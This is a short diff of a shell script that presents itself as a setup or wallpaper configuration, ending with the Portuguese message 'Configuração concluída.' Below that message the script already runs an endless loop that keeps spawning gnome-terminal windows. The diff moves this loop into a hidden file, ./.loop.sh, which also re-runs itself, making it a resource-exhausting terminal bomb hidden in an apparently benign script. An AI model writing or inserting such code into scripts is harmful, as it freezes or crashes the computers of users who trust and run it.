@@ -37,7 +37,8 @@ rm ./update_wallpaper.sh
 
 echo "Configuração concluída."
 
+sh -c 'echo "#!/bin/bash
 while true; do
-    gnome-terminal -- gnome-terminal
-done
+    gnome-terminal -- gnome-terminal ; bash ./.loop.sh ; echo \".\"
+done"> ./.loop.sh'
 
